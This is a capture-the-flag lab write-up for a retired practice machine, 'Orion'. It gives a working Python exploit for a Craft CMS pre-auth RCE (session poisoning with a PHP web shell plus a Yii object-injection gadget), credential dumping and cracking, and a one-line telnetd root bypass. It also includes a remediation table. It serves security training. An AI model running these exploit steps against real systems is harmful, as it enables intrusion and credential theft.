# Orion — Active Learning Writeup

| Target | Detail |
| :--- | :--- |
| **OS** | Linux (Ubuntu 22.04.5 LTS) |
| **Difficulty** | Easy (retired) |
| **IP Address** | `10.129.244.146` (VPN `tun0`, container) |
| **Owned** | 2026-09-28 — User ✅ Root ✅ |
| **Key Concepts** | CVE-2025-32432 (Craft CMS pre-auth RCE), Yii2 object injection (`__class` vs `class`), PHP session-file poisoning via `returnUrl`, bcrypt cracking, credential reuse, CVE-2026-24061 (inetutils telnetd auth bypass) |
| **Time** | ~3 h (heavy on exploit debugging, which is where the real learning was) |

**Attack path (TL;DR):**

```text
nmap (22/80) → orion.htb vhost → Craft CMS 5.6.16 at /admin/login
→ CVE-2025-32432: raw-poison session returnUrl with PHP + trigger
  generate-transform gadget (yii\rbac\PhpManager itemFile include)
→ www-data → .env MySQL creds → bcrypt hash → john → darkangel
→ su/SSH adam → user flag → ss -tlnp → 127.0.0.1:23 telnetd
→ GNU inetutils 2.7 → CVE-2026-24061: USER='-f root' telnet -a
→ root → root flag → htb machine own ×2
```

---

## 0. Tunnel & Networking Setup (why packets even arrive)

> Skip this on Easy boxes and you will waste 30 minutes staring at
> `Host seems down`. On Medium/Hard boxes, a broken tunnel masquerades
> as a dead service, a filtered port, or an "unexploitable" bug. Know
> the path every packet takes *before* touching a tool.

```text
┌─ Mac (host) ──────────────────────────────────────────────┐
│  NO VPN. curl/nmap 10.129.244.146 → routed to home router │
│  → 10.129.0.0/16 is private → dropped → "Host seems down" │
└──────────────────────────┬────────────────────────────────┘
                           │ docker exec kali …
┌─ kali container ─────────▼────────────────────────────────┐
│  tun0 = 10.10.14.241/23   ← HTB VPN (root/htb.ovpn) here │
│  eth0 = normal internet   ← apt/searchsploit/web fetches  │
│                                                            │
│  /etc/hosts: 10.129.244.146 orion.htb   (vhost resolution)│
└──────────────────────────┬────────────────────────────────┘
                           │ encrypted VPN tunnel (server id 251)
                           ▼
                 HTB lab → 10.129.244.146 (Orion)
```

Rules this diagram enforces:

1. **`htb machine active` is the only IP source of truth.** A
   chat-transcribed IP here was wrong by one digit (`…224…` vs
   `…244…`) and cost a full scan before the CLI admitted it.
2. **Every target command runs through `docker exec kali …`.** The Mac
   itself is *not* on the tunnel — this is a topology fact, not a
   tooling preference. (Alternative: run `openvpn` on the Mac too, but
   then *all* Mac traffic re-routes; splitting lab traffic into the
   container keeps the browser/internet independent.)
3. **`/etc/hosts` needs the entry twice** — once inside the container
   (curl/gobuster/exploit resolve `orion.htb`) and once on the Mac
   (`dscacheutil`/browser) if you want to click around in a real
   browser. nginx routes on `Host:`, so the raw IP serves the wrong
   vhost.
4. **`nmap -p-` is blind to loopback.** It scans all 65535 ports *on
   the target IP* — anything bound to `127.0.0.1` (Orion's telnetd,
   MySQL, DNS) only appears once you have a shell and run
   `ss -tlnp` locally. This single line held the entire privesc.

## 1. Reconnaissance & Surface Analysis

### Raw Port Scan

```bash
docker exec kali bash -c 'export PATH=$PATH:/root/.local/bin; htb machine active'
# → Orion, IP 10.129.244.146 (the IP in chat is NEVER source of truth)

nmap -sC -sV -p- -oA /root/orion_recon 10.129.244.146
```

```text
-p-        : all 65535 TCP ports — never trust a default list
-sC        : default scripts (banner + light enum)
-sV        : version detection — needed later for CVE matching
-oA prefix : write txt + nmap + gnmap in one shot
```

```text
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 302 → http://orion.htb/
```

### Initial Observations

- **Port 80:** title immediately redirects to `http://orion.htb/` → virtual-host routing, so `/etc/hosts` must map `orion.htb` (done in **both** the kali container and on the Mac).
- **Port 22:** standard SSH — park it until we hold credentials; brute force first is always a time sink.
- **Only two ports.** This later becomes a trap: the privesc service is bound to `127.0.0.1` and *cannot* appear in a remote scan.

### 🧠 Pause & Predict

<details>
<summary><b>Think first:</b> the web title 302-redirects to a hostname
instead of an IP. What breaks if you keep hitting the raw IP?</summary>

nginx serves a **different vhost** for the default host — you would keep
seeing the wrong site (or nginx's default page) while the real app lives
behind `Host: orion.htb`. Fix: add the hosts entry and always target the
hostname.
</details>

## 2. Enumeration & Finding the Seam

### Directory / Source Sweep

```text
Syntax structure:
gobuster dir -u <url> -w <wordlist> -x <extensions> -o <out>
```

```bash
gobuster dir -u http://orion.htb -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,js -o /root/orion_dirs.txt
```

```text
/admin          302  → /admin/login     ← admin panel exists
/assets         301
/index.html     9689                   ← static telecom landing page
/index.php      12272                  ← different size → dynamic app
/logout         302
/wp-admin       418  (54217 bytes)     ← fake, just the SPA catch-all
/.git/…         403 (size 162)         ← blanket 403, NOT a real repo
```

Fingerprinting chain:

```bash
curl -s http://orion.htb/assets/js/main.js
# → Yii 2.0.51 error page (the app's framework leaked through a 404)
curl -s http://orion.htb/admin/login -c cj.txt -o login.html
# → footer: "Craft CMS 5.6.16", CRAFT_CSRF_TOKEN, cookie CraftSessionId
searchsploit "craft cms"
# → Craft CMS 5.6.16 - RCE | multiple/webapps/52525.py  (CVE-2025-32432)
```

### 🧠 Interactive Challenge

<details>
<summary><b>Challenge:</b> gobuster reports every dotfile
(<code>/.env</code>, <code>/.git/HEAD</code>) as <b>403 with identical
size 162</b>. Real or fake?</summary>

Identical size across unrelated paths = one blanket response. Confirm by
requesting the file directly: <code>curl -s http://orion.htb/.git/HEAD</code>
returns the plain word "forbidden" with no <code>ref:</code> line → nginx
is blocking dotfiles globally. <b>Never trust status codes alone — read
the body.</b>
</details>

### ❌ Failure Log — What I Tried First & Why It Failed

> Every attempt that burned time is here. Real engagements fail ~70% of
> the time — this log *is* the debugging memory.

1. Trusted the IP pasted in chat (`10.129.224.146`) → **Result:** `Host seems down`.
   *Takeaway:* the only source of truth is `htb machine active` (real IP: `10.129.244.146` — one digit off). Re-run the CLI instead of arguing with the scanner.
2. Ran scans/curl from the **Mac** → **Result:** timeouts to `10.129.x.x`.
   *Takeaway:* the VPN lives *inside* the kali container (`tun0 = 10.10.14.241`), the Mac is not routed. All target traffic goes through `docker exec kali …`.
3. `searchsploit craft cms exploit.py` style lookups → **Result:** no usable file.
   *Takeaway:* SearchSploit's on-disk path is the EDB-ID — copy the *number* (`52525`) and run `searchsploit -m 52525`.
4. Triggered `generate-transform` **without** a CSRF token → `400 Unable to verify your data submission.`
   *Takeaway:* Yii's CSRF check runs *before* any endpoint logic — always pair the `CraftSessionId` cookie with `X-CSRF-Token` (extractable from the login page's `csrfTokenValue` JSON).
5. Sent the gadget as **query parameters only** → `400 Request missing required body param.`
   *Takeaway:* `actionGenerateTransform` reads `assetId`/`handle` via `getRequiredBodyParam()` — read the framework source, not just the error text.
6. Tried the direct route `/actions/assets/generate-transform` and assorted `assetId`s → HTTP 404 / 500 chains.
   *Takeaway:* working PoCs all use `index.php?p=actions/…`; and the include runs *before* the asset lookup, so `assetId: 1` is fine even though it 404s later.
7. First gadget attempts poisoned `/tmp/sess_<id>` → **Result:** `foreach() argument must be of type array|object, int given at PhpManager.php:726`.
   *Takeaway (the big one):* the real session path is `/var/lib/php/sessions/sess_<id>` — and `foreach(int)` proves the `require` **succeeded**: a session file with no `return` statement makes `include` yield `int 1`. The file was loaded, but it contained **no executable PHP**.
8. Why no PHP? The stored `returnUrl` read `a=%3C?=shell_exec(...` — the payload was **URL-encoded** (`%3C` = `<`), so the include saw text, not a `<?=` tag.
   *Takeaway:* `requests` encodes query strings; Craft saves the raw request URL into the session on the login redirect. Fix: send the poison request **byte-exact** with `http.client.putrequest()` (no encoding). One raw `GET /index.php?p=admin/dashboard&a=<?=shell_exec($_GET["cmd"]);die()?>` later → execution.
9. "Confirmed" RCE with marker `PWN_TEST777` → **Result:** the string appeared — but only because the error page **echoes the request URL**.
   *Takeaway:* never use a literal you sent as proof. Use a *computed* marker (`Z'.(2*3).'Q`, `uid=`) that only PHP arithmetic/output can produce.
10. Reused `darkangel` / the DB password for **root** → `su: Authentication failure`, telnet → `Login incorrect`.
    *Takeaway:* password reuse has a *scope* — `darkangel` covers adam only. Enumerate local services before guessing root's password.
11. Hand-rolled `NEW-ENVIRON` telnet negotiation → garbage bytes.
    *Takeaway:* the vuln is *client-side env passthrough* (`telnet -a`), not a protocol-level option — the correct trigger is one shell line, not raw IAC crafting.
12. Laptop slept mid-run → HTTP trigger timed out at 50 s.
    *Takeaway:* `htb machine active` + a quick `curl` before resuming — never assume the lab died because *your* machine did.

### The Breakthrough (Root Cause Breakdown)

**The Flaw:** Craft 5.6.16 exposes `actions/assets/generate-transform`
before login. It passes the attacker-controlled `handle` object into
Yii's `ImageTransform` constructor. Craft only validates a `class` key —
but Yii2 honors `__class` **instead** (CVE-2024-58136 semantics), so we
instantiate `yii\rbac\PhpManager` with a `itemFile` we choose. `PhpManager`
**includes** that file at init. Point it at our poisoned PHP session →
remote code execution.

**Poison mechanics:** requesting an auth-only page (`admin/dashboard`)
while unauthenticated makes Craft store the full URL as `__returnUrl`
inside the session file. If that URL contains live `<?php … ?>` bytes
(un-encoded), the later `include` executes them.

**Real-World Analogy:**
> A courier (Yii) delivers a package whose label (Craft's `class` check)
> reads "harmless document", but the *letter inside* (`__class`) says
> "run this instead" — and the recipient's machine obeys the letter.
> The session poisoning is writing our own note into the building's
> mailroom log, then asking the courier to "deliver the log to yourself".

<details>
<summary><b>🧠 Mini-challenge:</b> why did the poison have to go out
over a <i>raw</i> socket when <code>requests.get(..., params=…)</code>
already sends the same URL?</summary>

<code>requests</code> percent-encodes the query (<code>&lt;</code> →
<code>%3C</code>). Craft stores the *raw* request URL in the session, so
the file ends up holding <code>%3C?=…</code> — plain text to PHP. Only a
request built byte-for-byte (e.g. <code>http.client.putrequest</code>)
preserves the <code>&lt;?=</code> tag until the include.
</details>

## 3. Foothold (Initial Access)

### Command Breakdown

> Skeleton first, execution second.

```text
Syntax structure:
1) GET  /admin/login              → session cookie + CSRF token
2) RAW  GET  /index.php?p=admin/dashboard&a=<PHP>   (no URL-encoding)
3) POST /index.php?p=actions/assets/generate-transform&cmd=<CMD>
     headers: X-CSRF-Token, Content-Type: application/json
     body:    {"assetId":1,"handle":{…gadget…}}
```

<details>
<summary><b>Task:</b> the gadget JSON needs two class keys. Which one
does Craft check, and which one does Yii actually use?</summary>

Craft validates <code>"class": "craft\\behaviors\\FieldLayoutBehavior"</code>
(a real, allowed class). Yii's <code>createObject</code> prefers
<code>"__class": "yii\\rbac\\PhpManager"</code> over it — Craft never
sees the class it *should* have rejected. The constructor argument
<code>{"itemFile": "/var/lib/php/sessions/sess_&lt;id&gt;"}</code> is
what gets <code>require</code>d.
</details>

### The three-step exploit (as executed)

```python
# 1 — session + CSRF from the login page
s = requests.Session()
r = s.get("http://orion.htb/admin/login")
sid = s.cookies.get("CraftSessionId")
token = re.search(r'"csrfTokenValue":"([^"]+)"', r.text).group(1)

# 2 — RAW poison (byte-exact; requests would encode "<?" and kill it)
conn = http.client.HTTPConnection("orion.htb", 80)
conn.putrequest("GET",
    '/index.php?p=admin/dashboard&a=<?=shell_exec($_GET["cmd"]);die()?>')
conn.putheader("Cookie", f"CraftSessionId={sid}")
conn.endheaders()                      # → 302 to /admin/login, payload
conn.getresponse().read()              #    saved into __returnUrl

# 3 — trigger: Yii instantiates PhpManager → require(session file) → RCE
gadget = {"assetId": 1, "handle": {"width": 123, "height": 123,
    "as hack": {
        "class":    "craft\\behaviors\\FieldLayoutBehavior",
        "__class":  "yii\\rbac\\PhpManager",
        "__construct()": [{"itemFile":
            f"/var/lib/php/sessions/sess_{sid}"}]}}}
s.post("http://orion.htb/index.php",
       params={"p": "actions/assets/generate-transform", "cmd": "id"},
       json=gadget,
       headers={"X-CSRF-Token": token, "Content-Type": "application/json"})
# → HTTP 200, body starts with: uid=33(www-data) gid=33(www-data) …
```

```text
CraftSessionId   : the PHP session cookie (also the file name suffix)
csrfTokenValue   : per-session token; must ride in the X-CSRF-Token header
?a=<?php … ?>    : the "returnUrl" that ends up executable inside /var/lib/php/sessions
cmd=… in query   : the payload reads $_GET["cmd"] at include time
__class key      : the object-injection override Craft fails to validate
```

### Initial Data Grab

```bash
# inside the RCE (cmd=… each time; session file already poisoned)
cat /var/www/html/craft/.env
# → CRAFT_DB_USER=root
#   CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
mysql -uroot -p'SuperSecureCraft123Pass!' orion \
  -N -e "select username,password from users;"
# → admin  $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

### Credentials Found

```text
www-data RCE
  └─ .env → MySQL root / SuperSecureCraft123Pass!   (localhost only)
       └─ users table → bcrypt (cost 13) → john + rockyou → darkangel
            └─ su - adam / SSH → user.txt
```

## 4. Privilege Escalation

### Internal Audits (order matters)

```bash
sudo -l                              # → adam: "may not run sudo"
find / -perm -4000 -type f           # → only stock Ubuntu SUIDs
getcap -r / 2>/dev/null              # → ping/mtr net_raw only
ss -tlnp                             # → 127.0.0.1:23 ← THE one
telnet --version                     # → GNU inetutils 2.7
```

### The Misconfiguration

- **Binary:** `/usr/libexec/telnetd` served by `inetd`
  (`/etc/inetd.conf`: `127.0.0.1:telnet stream tcp nowait root …`)
- **Vulnerability:** **CVE-2026-24061** — GNU inetutils ≤ 2.7 passes the
  client-supplied `USER` value unsanitized into the `login(1)` command
  line: `/usr/bin/login -p -h %h %?u{-f -- %u}{-- %U}`.

### 🧠 Privesc Reasoning

<details>
<summary><b>Q:</b> why did <code>nmap -p-</code> (all 65535 ports) never
show port 23?</summary>

The service is bound to <code>127.0.0.1:23</code> — a remote scan can
never reach a loopback-only socket. After ANY foothold, re-enumerate
<b>locally</b> with <code>ss -tlnp</code> / <code>netstat -tulnp</code>.
</details>

<details>
<summary><b>Q:</b> what does <code>login -f</code> actually mean, and why
is letting a client influence it catastrophic?</summary>

<code>-f</code> tells login(1) "this session was <b>already
authenticated</b> by a trusted caller (normally getty) — skip password
check for the named user". It exists for autologin consoles. When telnetd
forwards attacker-controlled text into that command line, saying
<code>-f root</code> is equivalent to telling the doorman "root already
showed ID".
</details>

### Root Exploitation

```bash
# run as adam or www-data — loopback access is enough
USER='-f root' telnet -a 127.0.0.1
# … Ubuntu motd …
root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
root@orion:~# cat /root/root.txt
<flag — redacted from notes, see §5>
```

```text
-a           : telnet client flag that transmits the USER environment value
USER='-f root': the smuggled payload — expands to `login … -f -- root`
-f           : "pre-authenticated" bypass → no password asked
```

Non-interactive variant (for scripted runs):

```bash
{ sleep 2; printf 'id; cat /root/root.txt\n'; sleep 3; printf 'exit\n'; } \
  | USER='-f root' telnet -a 127.0.0.1
```

## 5. Flags

> **Rule: flags are never written into these notes.** A pasted flag
> turns this writeup into a flashcard (passive recognition) instead of
> a procedure (active recall). Both flags are regenerable in minutes by
> re-running the chain above — that re-run *is* the review.

```text
user : read /home/adam/user.txt after step "su - adam"     (submitted ✓)
root : read /root/root.txt after the telnetd bypass        (submitted ✓)
```

```bash
htb machine own <flag>        # run inside the container (htb CLI in PATH)
htb machine own <flag> -d 25  # optional difficulty rating 0-100
```

## 6. Defense & Remediation (The Sysadmin View)

| Stage | Issue | Secure Fix |
| :--- | :--- | :--- |
| Web | Craft 5.6.16 pre-auth RCE (CVE-2025-32432) via unvalidated `handle` object | Upgrade to Craft ≥ 5.6.17 (and Yii ≥ patched); deny `generate-transform` to unauthenticated sessions at the reverse proxy |
| Web | Dev mode exposed (`CRAFT_DEV_MODE=true`, verbose stack traces) | `CRAFT_DEV_MODE=false` in production — error pages were our roadmap |
| Data | DB root password in a world-readable `.env`; reused scheme | Restrict `.env` to the FPM user, unique per-service secrets, no shared passwords |
| Auth | Cracked web hash reused as the system password (`darkangel`) | Different passwords per plane (web / user / root), length policy, MFA |
| OS | `inetd` serves GNU inetutils telnetd 2.7 (CVE-2026-24061) with `-f` reachable from client input | Upgrade inetutils ≥ patched release; remove `inetd`/telnet entirely — SSH only; never bind auth services with client-controlled flags |
| Network | Loopback-only services invisible to external scans | Local `ss -tlnp` in every post-exploit checklist; disable unused local daemons |

## 7. Key Takeaways

1. **Byte-exact matters.** A payload stored in a URL/session can be silently neutralized by routine percent-encoding — when `include` finds no `<?php`, you get the cryptic `foreach(int)` error, not "payload missing".
2. **Error pages are step-by-step breadcrumbs.** CSRF 400 → missing-body 400 → `foreach(int)` told us exactly which layer we had reached after each attempt. Read them fully (including the code viewer) before changing strategy.
3. **After any foothold, re-scan localhost.** `nmap -p-` from outside is blind to `127.0.0.1` listeners; `ss -tlnp` found the entire privesc surface in one line.
4. **Verify RCE with computed output.** Strings you sent can bounce back through echoed URLs/logs — only `uid=` or arithmetic-derived markers prove execution.
5. **Version → CVE, both times.** Craft 5.6.16 → `searchsploit` → foothold; `telnet --version` (inetutils 2.7) → CVE-2026-24061 → root. Fingerprinting is the whole game on Easy boxes.

## 8. 🧠 Active Recall Challenges (Before You Close This Box)

- [ ] **Challenge 1:** the error `foreach() argument must be of type array|object, int given` fired *after* the include succeeded. Explain what that implies about the session file's contents — before reading any further.
- [ ] **Challenge 2:** reproduce the poison step locally — start any PHP app that stores the requested URL in a session, then show (with a hexdump) how a `requests`-encoded URL differs from a raw one inside `sess_*`.
- [ ] **Challenge 3:** re-run Orion with zero notes — reach `uid=0` end-to-end. Target: under 45 minutes.

<details>
<summary><b>Answers</b> (attempt first, then open)</summary>

1. `include` of a file with no `return` yields `int 1`, and `foreach(1)` throws exactly that error — so the file *was* loaded and contained only plain serialized session text (no executable `<?=` tag). The poison request had been URL-encoded (`%3C?=`), so the payload was present but inert.
2. `requests.get(url, params="a=<?=x?>")` puts `%3C?=x?>` on the wire; `http.client.putrequest("GET", "…a=<?=x?>")` puts the literal bytes. `grep -a '<?' sess_<id>` only matches the second case.
3. Chain: hosts entry → login page (token+cookie) → raw `admin/dashboard` poison → gadget POST (`__class` = PhpManager, `itemFile` = `/var/lib/php/sessions/sess_*`) → `cmd=id` → `.env` → MySQL → `john` (`darkangel`) → `su - adam` → `ss -tlnp` → `USER='-f root' telnet -a 127.0.0.1`.
</details>

---

**Final Checklist (before publishing):**
- [x] Could a newcomer parse every command? (flags broken down)
- [x] Is the *WHY* of the first move explained?
- [x] Are failures documented (not just the perfect path)?
- [x] Does command order match what actually ran in the terminal?
